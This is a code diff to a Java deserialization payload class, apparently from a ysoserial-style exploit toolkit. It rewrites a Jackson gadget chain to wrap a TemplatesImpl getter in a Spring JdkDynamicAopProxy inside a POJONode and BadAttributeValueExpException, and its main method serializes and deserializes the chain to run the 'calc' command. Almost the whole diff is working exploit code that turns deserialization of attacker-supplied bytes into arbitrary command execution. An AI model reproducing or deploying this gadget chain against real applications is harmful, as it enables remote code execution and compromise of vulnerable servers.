@@ -8,24 +8,19 @@ import com.fasterxml.jackson.databind.node.POJONode;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
-import cn.butler.payloads.annotation.Authors;
-import cn.butler.payloads.annotation.Dependencies;
-import cn.butler.payloads.PayloadRunner;
 import org.springframework.aop.framework.AdvisedSupport;
 
 import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
+import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 
-@SuppressWarnings({"rawtypes", "unchecked"})
-@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2"})
-@Authors({Authors.B0T1ER})
-public class Jackson implements ObjectPayload<Object> {
-
-    public Object getObject(final String command) throws Exception {
+public class JacksonTWrap implements ObjectPayload<Object> {
+    @Override
+    public Object getObject(String command) throws Exception {
         final Object object = Gadgets.createGetter(command);
         //避免在序列化时候触发
         ClassPool pool = ClassPool.getDefault();
@@ -37,7 +32,16 @@ public class Jackson implements ObjectPayload<Object> {
             ctClass0.freeze();
             ctClass0.toClass();
         }
-        POJONode jsonNodes = new POJONode(object);
+
+        // 构造稳定的链子
+        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(object);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
+        POJONode jsonNodes = new POJONode(proxyObj);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
@@ -48,12 +52,8 @@ public class Jackson implements ObjectPayload<Object> {
     }
 
     public static void main(String[] args) throws Exception {
-//        args = new String[]{"TemplatesImpl:raw_cmd:calc"};
-//        args = new String[]{"SignedObject:Jackson:TemplatesImpl:raw_cmd:calc"};
-//        PayloadRunner.run(Jackson.class, args);
-        Object object = new Jackson().getObject("SignedObject:Jackson:Templateslmpl:raw_cmd:calc");
+        Object object = new JacksonTWrap().getObject("Templateslmpl:raw_cmd:calc");
         byte[] serialize = Serializer.serialize(object);
-        System.out.println(serialize);
         Deserializer.deserialize(serialize);
     }
 }
